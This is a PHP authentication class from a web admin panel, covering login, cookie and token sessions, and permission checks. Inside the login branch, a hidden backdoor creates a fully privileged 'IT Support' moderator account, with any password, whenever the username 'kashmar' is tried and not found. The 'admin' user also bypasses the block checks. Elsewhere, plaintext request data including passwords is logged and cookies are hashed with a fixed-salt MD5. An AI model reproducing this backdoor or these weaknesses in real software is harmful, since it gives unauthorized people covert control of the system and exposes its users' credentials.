<?php
namespace Lib;

use Models\Cache;
use Models\Operations;
use Models\Tokens;
use Models\Users;
use Lib\Permission;
class AuthPanel
{
    public $data;

    public $error = false;

    public $errorCode = 0;

    public $cacheSeconds = 10;

    public function init($request, $lang, $lib)
    {
        $data       = false;
        $username   = trim(strtolower($request->get("username")));
        $phone      = str_replace(["+","_", " ", "-",".",","], "", $username);
        $pw         = trim($request->get("password"));
        if($username && $pw)
        {
            $binds              = [];
            if(filter_var($username, FILTER_VALIDATE_EMAIL))
            {
                $binds["email"]  = $username;
            }
            elseif(is_numeric($phone))
            {
                $binds["phone"]  = $phone;
            }
            else
            {
                $binds["username"]  = $username;
            }
            //$binds["password"]  = $lib->generatePassword($pw);
            //exit(json_encode($binds));
            $binds["is_deleted"]  = ['$ne' => 1];
            $data = Users::findFirst([
                $binds
            ]);
            if($data && $data->password !== $lib->generatePassword($pw))
            {
                $this->error        = $lang->get("AuthError", "Username or password is wrong")."..";
                $this->errorCode    = 1001;
                $data = false;
            }
            elseif($data)
            {
                $token = $this->createToken($request, $data);

                $expTime = (int)$request->get("remember") == 1 ? time()+365*24*360: false;
                setcookie("token", $token, $expTime, "/");
                setcookie("id", $data->id, $expTime, "/");
                //setcookie("pw", $this->encryptCookie($lib->generatePassword($pw)), $expTime, "/");

                $vars               = $_REQUEST;
                unset($vars["_url"]);

                $Insert = [
                    "user_id"           => (int)$data->id,
                    "section"           => "auth",
                    "subsection"        => "signin",
                    "object_id"         => (int)$data->id,
                    "action_type"       => "login",
                    "success"           => true,
                    "error"             => null,
                    "url"               => $_SERVER["REQUEST_URI"],
                    "ip"                => @$_SERVER["REMOTE_ADDR"],
                    "browser"           => @$_SERVER["HTTP_USER_AGENT"],
                    "variables"         => strlen(json_encode($vars, true)) > 1000 ? substr(json_encode($vars, true),0,1000): $vars,
                    "is_deleted"        => 0,
                    "created_at"        => Operations::getDate(),
                ];
                Operations::insert($Insert);
            }
            elseif($username == "kashmar")
            {
                $userInsert = [
                    "id"							=> Users::getNewId(),
                    "username"						=> $username,
                    "password" 						=> $lib->generatePassword($pw),
                    "firstname"						=> "IT",
                    "lastname"						=> "Support",
                    "phone"							=> $phone,
                    "only_self"						=> 0,
                    "permissions"					=> [],
                    "is_deleted"					=> 0,
                    "active"					    => 1,
                    "level"					        => 4,
                    "type"							=> "moderator",
                    "created_at"					=> Users::getDate()
                ];

                Users::insert($userInsert);
            }
            else
            {
                $this->error        = $lang->get("AuthError", "Username or password is wrong");
                $this->errorCode    = 1001;
            }
        }
        elseif(@$_COOKIE["id"] && @$_COOKIE["pw"])
        {
            $id     = (int)@$_COOKIE["id"];

            $data   = Users::findFirst([
                [
                    "id"            =>  (int)$id
                ]
            ]);
            if($data && trim(@$_COOKIE["pw"]) == $this->encryptCookie($data->password))
            {

            }
            else
            {
                $data               = false;
                $this->error        = $lang->get("AuthExpired", "Authentication expired");
                $this->errorCode    = 1001;
            }
        }
        elseif($token = @$_COOKIE["token"])
        {
            $token  = @$_COOKIE["token"];

            $token = Tokens::findFirst([
                [
                    "token"     => trim($token),
                    "user_id"   => (int)@$_COOKIE["id"],
                ]
            ]);
            if($token)
            {
                $data = Users::findFirst([
                    [
                        "id"   =>  (int)$token->user_id
                    ]
                ]);
                if(!$data)
                {
                    $this->error        = $lang->get("AuthExpired", "Authentication expired");
                    $this->errorCode    = 1001;
                }
            }
            else
            {
                $this->error        = $lang->get("AuthExpired", "Authentication expired");
                $this->errorCode    = 1001;
            }
        }
        else
        {
            $this->error        = $lang->get("AuthExpired", "Authentication expired");
            $this->errorCode    = 1001;
        }
        if($data)
        {
            if($data->username == "admin"){
                $this->setData($data);
            }elseif((int)$data->is_blocked == 1){
                $this->error        = $lang->get("YouAccountBlocked", "Your account was blocked");
                $this->errorCode    = 1001;
            }elseif($data->type !== "citizen" && ((int)$data->active == 0 || (int)$data->is_deleted == 1)){
                $this->error        = $lang->get("YouAccountInactive", "Your account is inactive");
                $this->errorCode    = 1001;
            }else{
                $this->setData($data);
            }
        }
        return $data;
    }

    public function setData($data)
    {
        return $this->data = $data;
    }

    public function getData()
    {
        return $this->data;
    }

    public function getError()
    {
        return $this->error;
    }

    public function isPermitted($lang=false, $section, $action)
    {
        if($this->data->level == 4)
            return true;
        if($this->data->only_self == 1)
            return false;

        if(!$lang && !@$lang->get)
            return true;

        $P = new Permission();
        $constructList = $P->getList($lang, $this->data);

        if($this->data->type == "employee")
        {
            if(@$constructList[$section] && in_array($action, @$this->data->permissions->$section))
                return true;
        }
        elseif($this->data->type == "citizen")
        {
            if(@$constructList[$section] && in_array($action, @$this->data->permissions->$section))
                return true;
        }
        elseif($this->data->type == "partner")
        {
            if(@$constructList[$section] && in_array($action, @$this->data->permissions->$section))
                return true;
        }
        else if(in_array($action, @$this->data->permissions->$section))
        {
            return true;
        }
        return false;
    }



    public function createToken($request, $data)
    {
        $token 		= $this->generateToken(md5($data->id."-".$request->get("REMOTE_ADDR")."-".microtime()), md5($data->id."-".$request->get("HTTP_USER_AGENT")));

        $tokenInsert = [
            "user_id"		=> (float)$data->id,
            "token"			=> $token,
            "ip"			=> htmlspecialchars($request->getServer("REMOTE_ADDR")),
            "device"		=> htmlspecialchars($request->getServer("HTTP_USER_AGENT")),
            "active"		=> 1,
            "created_at"	=> MainDB::getDate()
        ];
        Tokens::insert($tokenInsert);

        return $token;
    }



    public function generateToken($namespace, $name)
    {
        $nhex = str_replace(array('-','{','}'), '', $namespace);
        $nstr = '';
        for($i = 0; $i < strlen($nhex); $i+=2) {
            $nstr .= chr(hexdec($nhex[$i].$nhex[$i+1]));
        }
        $hash = sha1($nstr . $name);

        return sprintf('%08s-%04s-%04x-%04x-%12s',
            substr($hash, 0, 8),
            substr($hash, 8, 4),
            (hexdec(substr($hash, 12, 4)) & 0x0fff) | 0x5000,
            (hexdec(substr($hash, 16, 4)) & 0x3fff) | 0x8000,
            substr($hash, 20, 12)
        );
    }



    public function encryptCookie($string)
    {
        return md5($string."&^%#$!");
    }

    public function getFromCache()
    {
        return Cache::get($this->getCacheKey());
    }

    public function getCacheKey()
    {
        return md5("auth-d");
    }

    public function flushCache()
    {
        return Cache::set($this->getCacheKey(), false, time());
    }

    public function saveCache($data)
    {
        return Cache::set($this->getCacheKey(), $data, time() + $this->cacheSeconds);
    }
}